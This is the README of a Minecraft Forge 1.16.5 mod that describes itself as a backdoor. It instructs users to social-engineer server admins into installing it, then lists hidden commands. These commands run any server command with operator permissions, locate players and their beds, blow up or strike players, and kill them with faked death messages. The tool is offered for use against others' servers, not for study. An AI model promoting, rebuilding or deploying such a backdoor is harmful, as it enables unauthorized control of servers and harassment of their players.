# Forge 1.16.5 backdoor
Had to remake my Forge 1.20.1 backdoor in this silly mod loader. This one however, is 10x better than the Fabric one. See the commands in the "to use" section down below.

Installation:
- Social engineer server admins into adding this into the mods folder
- Put your UUID in the ExampleMod.java file so you can whitelist/remove people from being able to access the commands whenever you want.
- Make a UUIDs.txt in the root path and put a UUID in it, example: 933106ea-eb93-4abc-bcf7-5d75c4a39aeb


To use:
- /za run "op Filthiest" (runs any command under the server with max permissions, even if you don't have operator)
- /za pos Filthiest (obtains the players current position, and what dimension they are in)
- /za base Filthiest (obtains the coordinates to the players bed, basically a base finder)
- /za explode Filthiest (summons a primed TnT under their feet blowing them up)
- /za lightning Filthiest (summons a lightning bolt on them)
- /za ck Filthiest [text] (turns off death messages, kills the player, then uses the /tellraw command to fake a death message. Example: /za ck Filthiest Filthiest died because he's a goat)

## Video showcase:
https://www.youtube.com/watch?v=ROr_gue_7Fc
